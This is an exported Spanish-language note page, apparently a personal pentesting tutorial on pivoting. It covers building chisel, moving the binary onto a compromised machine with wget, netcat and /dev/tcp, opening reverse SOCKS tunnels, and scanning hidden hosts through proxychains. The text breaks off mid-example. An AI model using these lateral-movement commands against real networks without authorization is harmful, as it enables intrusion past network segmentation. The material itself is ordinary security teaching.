<!DOCTYPE html> <html><head>
		<title>Pivoting</title>
		<base href="..\..\..\..\..\../">
		<meta id="root-path" root-path="..\..\..\..\..\../">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">
		<meta charset="UTF-8">
		<meta name="description" content="Hacking - Pivoting">
		<meta property="og:title" content="Pivoting">
		<meta property="og:description" content="Hacking - Pivoting">
		<meta property="og:type" content="website">
		<meta property="og:url" content="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/pivoting/pivoting.html">
		<meta property="og:image" content="https://dobliuw.com/lib/media/enviroment_pivoting_3_machines.png">
		<meta property="og:site_name" content="Hacking">
		<meta name="author" content="Dobliuw"><link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://dobliuw.com/lib/rss.xml"><script async="" id="webpage-script" src="lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script type="module" async="" id="graph-view-script" src="lib/scripts/graph-view.js"></script><script async="" id="graph-wasm-script" src="lib/scripts/graph-wasm.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-render-worker-script" src="lib/scripts/graph-render-worker.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="tinycolor-script" src="lib/scripts/tinycolor.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="pixi-script" src="lib/scripts/pixi.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="minisearch-script" src="lib/scripts/minisearch.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="lib/media/favicon.png"><script async="" id="graph-data-script" src="lib/scripts/graph-data.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-horizontal-spacing:0.6em;--tree-vertical-spacing:0.6em;--sidebar-margin:12px}.sidebar{height:100%;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));font-size:14px;z-index:10;position:relative;overflow:hidden;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}.sidebar-left{left:0}.sidebar-right{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}body.floating-sidebars .sidebar{position:absolute}.sidebar-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .sidebar-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}.sidebar-left .sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}.sidebar-right .sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:2em;width:var(--sidebar-width);top:var(--sidebar-margin);padding-inline:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}.sidebar-left .sidebar-topbar{left:0}.sidebar-right .sidebar-topbar{right:0}.topbar-content{overflow:hidden;overflow:clip;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:0!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}.sidebar-left .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}.sidebar-right .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.sidebar-section-header{margin:0 0 1em 0;text-transform:uppercase;letter-spacing:.06em;font-weight:600}body{transition:background-color var(--color-fade-speed) ease-in-out}.webpage-container{display:flex;flex-direction:row;height:100%;width:100%;align-items:stretch;justify-content:center}.document-container{opacity:1;flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0;transition:opacity .2s ease-in-out}.document-container>.markdown-preview-view{margin:var(--sidebar-margin);margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;background-color:var(--background-primary);transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:80vh!important;width:100%!important;max-width:var(--line-width)!important;flex-basis:var(--line-width)!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}.markdown-rendered img:not([width]),.view-content img:not([width]){max-width:100%;outline:0}.document-container>.view-content.embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}.document-container>.view-content.embed>*{max-width:100%;max-height:100%;object-fit:contain}:has(> :is(.math,table)){overflow-x:auto!important}.document-container>.view-content{overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){if("file:"!=location.protocol){let e=document.querySelectorAll("include");for(let t=0;t<e.length;t++){let o=e[t],l=o.getAttribute("src");try{const e=await fetch(l);if(!e.ok){console.log("Could not include file: "+l),o?.remove();continue}let t=await e.text(),n=document.createRange().createContextualFragment(t),i=Array.from(n.children);for(let e of i)e.classList.add("hide"),e.style.transition="opacity 0.5s ease-in-out",setTimeout((()=>{e.classList.remove("hide")}),10);o.before(n),o.remove(),console.log("Included file: "+l)}catch(e){o?.remove(),console.log("Could not include file: "+l,e);continue}}}else{if(document.querySelectorAll("include").length>0){var e=document.createElement("div");e.id="error",e.textContent="Web server exports must be hosted on an http / web server to be viewed correctly.",e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.fontSize="1.5em",e.style.fontWeight="bold",e.style.textAlign="center",document.body.appendChild(e),document.querySelector(".document-container")?.classList.remove("hide")}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script"))),l=0;!function e(){let n=o[l];l++,n&&"true"!=n.getAttribute("loaded")||l<o.length&&e(),l<o.length?n.addEventListener("load",e):t()}()}</script><link rel="stylesheet" href="lib/styles/obsidian.css"><link rel="stylesheet" href="lib/styles/theme.css"><link rel="preload" href="lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/main-styles.css"></noscript></head><body class="publish css-settings-manager theme-dark show-inline-title show-ribbon"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="webpage-container workspace"><div class="sidebar-left sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="search-input-container"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div class="search-input-clear-button" aria-label="Clear search"></div></div><include src="lib/html/file-tree.html"></include></div><script defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div><div class="document-container markdown-reading-view hide"><div class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width"><style id="MJX-CHTML-styles">mjx-container[jax=CHTML]{line-height:0}mjx-container [space="1"]{margin-left:.111em}mjx-container [space="2"]{margin-left:.167em}mjx-container [space="3"]{margin-left:.222em}mjx-container [space="4"]{margin-left:.278em}mjx-container [space="5"]{margin-left:.333em}mjx-container [rspace="1"]{margin-right:.111em}mjx-container [rspace="2"]{margin-right:.167em}mjx-container [rspace="3"]{margin-right:.222em}mjx-container [rspace="4"]{margin-right:.278em}mjx-container [rspace="5"]{margin-right:.333em}mjx-container [size="s"]{font-size:70.7%}mjx-container [size=ss]{font-size:50%}mjx-container [size=Tn]{font-size:60%}mjx-container [size=sm]{font-size:85%}mjx-container [size=lg]{font-size:120%}mjx-container [size=Lg]{font-size:144%}mjx-container [size=LG]{font-size:173%}mjx-container [size=hg]{font-size:207%}mjx-container [size=HG]{font-size:249%}mjx-container [width=full]{width:100%}mjx-box{display:inline-block}mjx-block{display:block}mjx-itable{display:inline-table}mjx-row{display:table-row}mjx-row>*{display:table-cell}mjx-mtext{display:inline-block}mjx-mstyle{display:inline-block}mjx-merror{display:inline-block;color:red;background-color:#ff0}mjx-mphantom{visibility:hidden}mjx-assistive-mml{top:0;left:0;clip:rect(1px,1px,1px,1px);user-select:none;position:absolute!important;padding:1px 0 0!important;border:0!important;display:block!important;width:auto!important;overflow:hidden!important}mjx-assistive-mml[display=block]{width:100%!important}mjx-math{display:inline-block;text-align:left;line-height:0;text-indent:0;font-style:normal;font-weight:400;font-size:100%;letter-spacing:normal;border-collapse:collapse;overflow-wrap:normal;word-spacing:normal;white-space:nowrap;direction:ltr;padding:1px 0}mjx-container[jax=CHTML][display=true]{display:block;text-align:center;margin:1em 0}mjx-container[jax=CHTML][display=true][width=full]{display:flex}mjx-container[jax=CHTML][display=true] mjx-math{padding:0}mjx-container[jax=CHTML][justify=left]{text-align:left}mjx-container[jax=CHTML][justify=right]{text-align:right}mjx-mn{display:inline-block;text-align:left}mjx-c{display:inline-block}mjx-utext{display:inline-block;padding:.75em 0 .2em}mjx-mo{display:inline-block;text-align:left}mjx-stretchy-h{display:inline-table;width:100%}mjx-stretchy-h>*{display:table-cell;width:0}mjx-stretchy-h>*>mjx-c{display:inline-block;transform:scaleX(1)}mjx-stretchy-h>*>mjx-c::before{display:inline-block;width:initial}mjx-stretchy-h>mjx-ext{overflow:clip visible;width:100%}mjx-stretchy-h>mjx-ext>mjx-c::before{transform:scaleX(500)}mjx-stretchy-h>mjx-ext>mjx-c{width:0}mjx-stretchy-h>mjx-beg>mjx-c{margin-right:-.1em}mjx-stretchy-h>mjx-end>mjx-c{margin-left:-.1em}mjx-stretchy-v{display:inline-block}mjx-stretchy-v>*{display:block}mjx-stretchy-v>mjx-beg{height:0}mjx-stretchy-v>mjx-end>mjx-c{display:block}mjx-stretchy-v>*>mjx-c{transform:scaleY(1);transform-origin:left center;overflow:hidden}mjx-stretchy-v>mjx-ext{display:block;height:100%;box-sizing:border-box;border:0 solid transparent;overflow:visible clip}mjx-stretchy-v>mjx-ext>mjx-c::before{width:initial;box-sizing:border-box}mjx-stretchy-v>mjx-ext>mjx-c{transform:scaleY(500) translateY(.075em);overflow:visible}mjx-mark{display:inline-block;height:0}mjx-c::before{display:block;width:0}.MJX-TEX{font-family:MJXZERO,MJXTEX}.TEX-B{font-family:MJXZERO,MJXTEX-B}.TEX-I{font-family:MJXZERO,MJXTEX-I}.TEX-MI{font-family:MJXZERO,MJXTEX-MI}.TEX-BI{font-family:MJXZERO,MJXTEX-BI}.TEX-S1{font-family:MJXZERO,MJXTEX-S1}.TEX-S2{font-family:MJXZERO,MJXTEX-S2}.TEX-S3{font-family:MJXZERO,MJXTEX-S3}.TEX-S4{font-family:MJXZERO,MJXTEX-S4}.TEX-A{font-family:MJXZERO,MJXTEX-A}.TEX-C{font-family:MJXZERO,MJXTEX-C}.TEX-CB{font-family:MJXZERO,MJXTEX-CB}.TEX-FR{font-family:MJXZERO,MJXTEX-FR}.TEX-FRB{font-family:MJXZERO,MJXTEX-FRB}.TEX-SS{font-family:MJXZERO,MJXTEX-SS}.TEX-SSB{font-family:MJXZERO,MJXTEX-SSB}.TEX-SSI{font-family:MJXZERO,MJXTEX-SSI}.TEX-SC{font-family:MJXZERO,MJXTEX-SC}.TEX-T{font-family:MJXZERO,MJXTEX-T}.TEX-V{font-family:MJXZERO,MJXTEX-V}.TEX-VB{font-family:MJXZERO,MJXTEX-VB}mjx-stretchy-h mjx-c,mjx-stretchy-v mjx-c{font-family:MJXZERO,MJXTEX-S1,MJXTEX-S4,MJXTEX,MJXTEX-A!important}@font-face{font-family:MJXZERO;src:url("lib/fonts/mathjax_zero.woff") format("woff")}@font-face{font-family:MJXTEX;src:url("lib/fonts/mathjax_main-regular.woff") format("woff")}@font-face{font-family:MJXTEX-B;src:url("lib/fonts/mathjax_main-bold.woff") format("woff")}@font-face{font-family:MJXTEX-I;src:url("lib/fonts/mathjax_math-italic.woff") format("woff")}@font-face{font-family:MJXTEX-MI;src:url("lib/fonts/mathjax_main-italic.woff") format("woff")}@font-face{font-family:MJXTEX-BI;src:url("lib/fonts/mathjax_math-bolditalic.woff") format("woff")}@font-face{font-family:MJXTEX-S1;src:url("lib/fonts/mathjax_size1-regular.woff") format("woff")}@font-face{font-family:MJXTEX-S2;src:url("lib/fonts/mathjax_size2-regular.woff") format("woff")}@font-face{font-family:MJXTEX-S3;src:url("lib/fonts/mathjax_size3-regular.woff") format("woff")}@font-face{font-family:MJXTEX-S4;src:url("lib/fonts/mathjax_size4-regular.woff") format("woff")}@font-face{font-family:MJXTEX-A;src:url("lib/fonts/mathjax_ams-regular.woff") format("woff")}@font-face{font-family:MJXTEX-C;src:url("lib/fonts/mathjax_calligraphic-regular.woff") format("woff")}@font-face{font-family:MJXTEX-CB;src:url("lib/fonts/mathjax_calligraphic-bold.woff") format("woff")}@font-face{font-family:MJXTEX-FR;src:url("lib/fonts/mathjax_fraktur-regular.woff") format("woff")}@font-face{font-family:MJXTEX-FRB;src:url("lib/fonts/mathjax_fraktur-bold.woff") format("woff")}@font-face{font-family:MJXTEX-SS;src:url("lib/fonts/mathjax_sansserif-regular.woff") format("woff")}@font-face{font-family:MJXTEX-SSB;src:url("lib/fonts/mathjax_sansserif-bold.woff") format("woff")}@font-face{font-family:MJXTEX-SSI;src:url("lib/fonts/mathjax_sansserif-italic.woff") format("woff")}@font-face{font-family:MJXTEX-SC;src:url("lib/fonts/mathjax_script-regular.woff") format("woff")}@font-face{font-family:MJXTEX-T;src:url("lib/fonts/mathjax_typewriter-regular.woff") format("woff")}@font-face{font-family:MJXTEX-V;src:url("lib/fonts/mathjax_vector-regular.woff") format("woff")}@font-face{font-family:MJXTEX-VB;src:url("lib/fonts/mathjax_vector-bold.woff") format("woff")}mjx-c.mjx-c31::before{padding:.666em .5em 0 0;content:"1"}mjx-c.mjx-c2217::before{padding:.465em .5em 0 0;content:"∗"}mjx-c.mjx-c38::before{padding:.666em .5em .022em 0;content:"8"}mjx-c.mjx-c2B::before{padding:.583em .778em .082em 0;content:"+"}mjx-c.mjx-c30::before{padding:.666em .5em .022em 0;content:"0"}mjx-c.mjx-c34::before{padding:.677em .5em 0 0;content:"4"}mjx-c.mjx-c32::before{padding:.666em .5em 0 0;content:"2"}mjx-c.mjx-c3D::before{padding:.583em .778em .082em 0;content:"="}</style><div class="markdown-preview-sizer markdown-preview-section"><h1 class="page-title heading inline-title" id="¿ Que es el <strong>pivoting</strong> ?"><p dir="auto">¿ Que es el <strong>pivoting</strong> ?</p></h1><div class="el-h1 heading-wrapper"><div class="heading-children"><div class="el-p"><p dir="auto">El <strong>pivoting</strong> (También conocido como "<em>hopping</em>") es una técnica utilizada en pruebas de penetración y en el análisis de redes que implica el uso de una máquina comprometida para atacar otras máquinas o redes en el mismo entorno.</p></div><div class="el-p"><p dir="auto">Por ejemplo, si un atacante ha comprometido una máquina en una red corporativa, puede utilizar técnicas de pivoting para utilizar esa máquina como punto de salto para atacar otras máquinas en la misma red que de otra manera no serían accesibles. Esto se logra a través de la creación de túneles de comunicación desde la máquina comprometida a otras máquinas en la red.</p></div><div class="el-p"><p dir="auto">El pivoting puede ser utilizado para superar restricciones de seguridad que de otra manera impedirían a un atacante acceder a determinadas máquinas o redes. Por ejemplo, si una red corporativa utiliza segmentación de red para separara diferentes partes de la red, el pivoting puede ser utilizado para superar esta restricción y permitir que un atacante salte de una red a otra. </p></div><div class="el-hr"><hr></div></div></div><div class="el-h1 heading-wrapper"><h1 data-heading="Conceptos" dir="auto" class="heading" id="Conceptos">Conceptos</h1><div class="heading-children"><div class="el-p"><p dir="auto">Como sabemos el pivoting consiste en movernos desde una máquina a otra, pudiendo así llegar a tener conexión con máquinas las cuales previamente no contabamos con traza, esto se puede hacer de múltiples formas, pero una herramienta muy utilizada para el pivoting es <a data-tooltip-position="top" aria-label="'https://github.com/jpillora/chisel/releases'" rel="noopener nofollow" class="external-link" href="'https://github.com/jpillora/chisel/releases'" target="_blank">chisel</a>, la cual hay que correr desde la máquina atacante como <strong>server</strong> y desde la/s máquina/s victima/s como <strong>client</strong>. </p></div><div class="el-h6 heading-wrapper"><h6 data-heading="Downloading Chisel (Linux)" dir="auto" class="heading" id="Downloading_Chisel_(Linux)"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Downloading Chisel (Linux)</h6><div class="heading-children"><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token function">git</span> clone https://github.com/jpillora/chisel
<span class="token builtin class-name">cd</span> chisel

go build -ldflags <span class="token string">"-s -w"</span> <span class="token builtin class-name">.</span>
upx chisel
</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="el-h6 heading-wrapper"><h6 data-heading="Downloading Chisel (Windows)" dir="auto" class="heading" id="Downloading_Chisel_(Windows)"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Downloading Chisel (Windows)</h6><div class="heading-children"><div class="el-p"><p dir="auto">En este caso para descargar Chisel a una máquina Windows, en el apartado de <em>Releases</em> descargamos la versión que necesitemos, por ejemplo <strong>chisel_1.7.7_windows_amd64.gz</strong>.</p></div><div class="el-p"><p dir="auto">Una vez que tengamos <strong>chisel</strong> en nuestra máquina, si deseamos hacer pivoting entre la <em>Máquina 1</em> con la <em>Máquina 2</em> para llegar a una <em>Máquina 3</em>, deberiamos trasladar el chisel a nuestra <em>Máquina 2</em>, para eso existen varías maneras (Ignorando el descargarlo desde google)</p></div><div class="el-p"><p dir="auto">Con <strong>python</strong>: </p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token comment"># Máquina 1 en donde este el {binary}: </span>
python3 -m http.server <span class="token punctuation">{</span>port<span class="token punctuation">}</span>
<span class="token comment"># Máquina 2: </span>
<span class="token function">wget</span> http://<span class="token punctuation">{</span>ip<span class="token punctuation">}</span>:<span class="token punctuation">{</span>port<span class="token punctuation">}</span>/<span class="token punctuation">{</span>binary<span class="token punctuation">}</span>
</code><button class="copy-code-button">Copy</button></pre></div><div class="el-p"><p dir="auto">Si tenemos <em>ssh</em> configurado con un <em>authorized_keys</em> en la máquina: </p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token function">scp</span> <span class="token punctuation">{</span>binary<span class="token punctuation">}</span> <span class="token punctuation">{</span>user<span class="token punctuation">}</span>@<span class="token punctuation">{</span>ip<span class="token punctuation">}</span>:/<span class="token punctuation">{</span>path<span class="token punctuation">}</span>
</code><button class="copy-code-button">Copy</button></pre></div><div class="el-p"><p dir="auto">Con <strong>netcat</strong>: </p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token comment"># Máquina 1: </span>
<span class="token function">nc</span> -nvlp <span class="token punctuation">{</span>port<span class="token punctuation">}</span> <span class="token operator">&lt;</span> <span class="token punctuation">{</span>binary<span class="token punctuation">}</span>
<span class="token comment"># Máquina 2: </span>
<span class="token function">cat</span> <span class="token operator">&lt;</span> /dev/tcp/<span class="token punctuation">{</span>ip<span class="token punctuation">}</span>/<span class="token punctuation">{</span>port<span class="token punctuation">}</span> <span class="token operator">&gt;</span> <span class="token punctuation">{</span>name_binary<span class="token punctuation">}</span>
</code><button class="copy-code-button">Copy</button></pre></div><div class="el-p"><p dir="auto">Con <strong>base64</strong>:</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token comment"># Máquina 1:</span>
base64 -w <span class="token number">0</span> <span class="token punctuation">{</span>file<span class="token punctuation">}</span> <span class="token operator">|</span> xclip -sel clip
<span class="token comment"># Máquina 2: </span>
<span class="token builtin class-name">echo</span> <span class="token string">'{base64_string}'</span> <span class="token operator">|</span> base64 -d <span class="token operator">&gt;</span> <span class="token punctuation">{</span>binary_name<span class="token punctuation">}</span>
</code><button class="copy-code-button">Copy</button></pre></div><div class="el-p"><p dir="auto">Una vez que tengamos <strong>chisel</strong> en la <em>Máquina 2</em> que tiene conexión con la <em>Máquina 3</em> con la cual nuestra <em>Máquina 1</em> no tiene conexión, en nuestra máquina de atacante (La <em>Máquina 1</em>) deberíamos crear el <em>server</em> de chisel: </p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">./chisel server --reverse -p <span class="token number">1234</span>
</code><button class="copy-code-button">Copy</button></pre></div><div class="el-p"><p dir="auto">Mientras que si quisieramos compartir un puerto especifico de la Máquina 3 desde la Máquina 2 para poder acceder desde la Máquina 1, podríamos ejecutar:</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token comment"># Desde nuestra Máquina 2 conectarnos a nuestro server de chisel haciend port forwarding de un puerto de la máquina 3 a nuestra máquina por el puerto 8899</span>
./chisel client <span class="token punctuation">{</span>IP_atacante<span class="token punctuation">}</span>:1234 R:8899:<span class="token punctuation">{</span>Máquina3_IP<span class="token punctuation">}</span>:<span class="token punctuation">{</span>Máquina3_port<span class="token punctuation">}</span>
</code><button class="copy-code-button">Copy</button></pre></div><div class="el-p"><p dir="auto">Al ejecutar el comando de arriba,  si bien no tenemos conexión con la Máquina 3, la Máquina 2 se esta conectando a nuestro servidor de chisel brindando la disponibilidad de un puerto seleccionado de la Máquina 3 y permitiendonos acceder a este en un puerto seleccionado (Ej: 8899)</p></div><div class="el-p"><p dir="auto">Pero también podemos permitir acceso a todos los puertos para no tener que jugar puerto por puerto, de manera que si lo que nos interesa es tener completa conexión con la Máquina 3 desde la Máquina 1, en la Máquina 2 podríamos ejecutar el siguiente comando: </p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">./chisel client <span class="token punctuation">{</span>IP_atacante<span class="token punctuation">}</span>:1234 R:8899:socks
</code><button class="copy-code-button">Copy</button></pre></div><div class="el-p"><p dir="auto">De esta manera, por el puerto indicado (8899, si no especificamos 'R:socks' se habré por defecto el 1080) tendríamos conexión desde la Máquina 1 a la Máquina 3 pasando por este tunel. </p></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="Recordemos que así como podemos establecer un tunel a la vez podemos traernos un puerto especifico así como un protocolo distinto:" dir="auto" class="heading" id="Recordemos_que_así_como_podemos_establecer_un_tunel_a_la_vez_podemos_traernos_un_puerto_especifico_así_como_un_protocolo_distinto:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Recordemos que así como podemos establecer un tunel a la vez podemos traernos un puerto especifico así como un protocolo distinto:</h4><div class="heading-children"><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">./chisel client <span class="token punctuation">{</span>IP_atacante<span class="token punctuation">}</span>:1234 R:socks R:443:<span class="token punctuation">{</span>Máquina3_IP<span class="token punctuation">}</span>:443/udp
</code><button class="copy-code-button">Copy</button></pre></div><div class="el-p"><p dir="auto">Pero una vez creado el tunel, tenemos que agregar este en el archivo <strong>/etc/proxychains4.conf</strong>, al tratarse de un único tunel descomentamos la línea que dice <strong>strict_chain</strong> y al final de todo agregamos la línea <strong>"socks5 127.0.0.1 8899"</strong> para indicar que cuando usemos la herramienta <strong>proxychains</strong> y esta leea del archivo de configuración, entienda que tiene que pasar por el tunel levantado en nuestro localhost por el puerto indicado (Ej. 8899)</p></div><div class="el-p"><p dir="auto">Por ende, si desde nuestra Máquina 1 (Atacante) indicamos un escaneo a la máquina 3, no podremos, pero jugando con <strong>proxychains</strong> esta herramienta leera del archivo  <strong>/etc/proxychains4.conf</strong> donde configuramos un <strong>socks5</strong> en nuestro localhost por el puerto indicado. </p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token comment"># No encontrara el host</span>
nmap -p- --min-rate <span class="token number">5000</span> -vvv -Pn -n <span class="token punctuation">{</span>Máquina3_IP<span class="token punctuation">}</span>
<span class="token comment"># Encontrara el host </span>
proxychains nmap -Pn -sT -p- --min-rate <span class="token number">5000</span> -vvv -n <span class="token punctuation">{</span>Máquina3_IP<span class="token punctuation">}</span>
</code><button class="copy-code-button">Copy</button></pre></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="ACLARACIÓN: Para que funcione nmap a través del proxychain es necesario el parametro -Pn y -sT." dir="auto" class="heading" id="ACLARACIÓN:_Para_que_funcione_nmap_a_través_del_proxychain_es_necesario_el_parametro_-Pn_y_-sT."><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>ACLARACIÓN: Para que funcione nmap a través del proxychain es necesario el parametro -Pn y -sT.</h4><div class="heading-children"><div class="el-p"><p dir="auto">Si queremos que el escaneo con nmap vaya más rapido, podríamos usar el siguiente comando:</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token function">seq</span> <span class="token number">1</span> <span class="token number">65535</span> <span class="token operator">|</span> <span class="token function">xargs</span> -P <span class="token number">500</span> -I <span class="token punctuation">{</span><span class="token punctuation">}</span> proxychains nmap -Pn -sT -p<span class="token punctuation">{</span><span class="token punctuation">}</span> -T5 -n -v --open <span class="token punctuation">{</span>Máquina3_IP<span class="token punctuation">}</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"tcp open"</span>
</code><button class="copy-code-button">Copy</button></pre></div><div class="el-p"><p dir="auto">A partir de aquí, todo es necesario que pase por el <strong>proxychain</strong>, ejemplos: </p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token comment"># No encontrara el host</span>
whatweb http://<span class="token punctuation">{</span>Máquina3_IP<span class="token punctuation">}</span>
<span class="token comment"># Encontrara el host</span>
proxychains whatweb http://<span class="token punctuation">{</span>Máquina3_IP<span class="token punctuation">}</span>

<span class="token comment"># No encontrara el host </span>
